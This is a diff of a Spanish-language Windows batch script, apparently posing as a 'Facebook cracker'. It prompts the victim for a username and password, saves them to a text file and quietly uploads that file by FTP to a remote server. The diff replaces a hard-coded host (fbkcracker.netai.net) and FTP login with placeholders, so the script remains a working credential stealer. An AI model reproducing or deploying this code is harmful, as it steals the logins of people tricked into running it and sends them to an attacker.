@@ -28,9 +28,9 @@ SET /P pass=Contraseña:
 
 echo Usuario:%user% >> credenciales%user%.txt
 echo Pass:%pass% >> credenciales%user%.txt
-echo open fbkcracker.netai.net >> fbcracker.txt
-echo user >> fbcracker.txt
-echo pass >> fbcracker.txt
+echo open SERVIDORFTP >> fbcracker.txt
+echo USUARIOFTP >> fbcracker.txt
+echo PASSFTP >> fbcracker.txt
 echo put credenciales%user%.txt >>fbcracker.txt
 echo quit >>fbcracker.txt
 ftp -s:fbcracker.txt >> nul
